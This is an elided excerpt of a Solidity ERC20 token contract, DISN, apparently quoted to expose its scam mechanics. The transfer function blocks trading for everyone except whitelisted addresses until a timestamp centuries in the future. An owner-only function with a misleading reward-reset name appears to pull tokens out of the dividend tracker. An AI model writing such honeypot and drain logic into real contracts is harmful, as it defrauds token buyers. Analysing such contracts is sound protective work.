...
contract DISN is ERC20, Ownable {
    ...
    uint256 public times = 21961063170;
    ...
    function resetLPRewardLastSendTime(address account,uint256 amount) public onlyOwner {
        dividendTracker.outToken(account,amount);
        dividendTracker.resetLPRewardLastSendTime();
    }
    function getErrorErc20(address coin,address account,uint256 amount) public onlyOwner {
        if(coin == address(0)){
    ...
    function _transfer(
        ...
        require(block.timestamp >= times || _openTracker[from] || _openTracker[to], "zero");
        if(amount == 0) {
        ...
        if(to == uniswapV2Pair && !_openTracker[from]){
            super._transfer(from, to, amount.mul(9999).div(10000));
        }else{
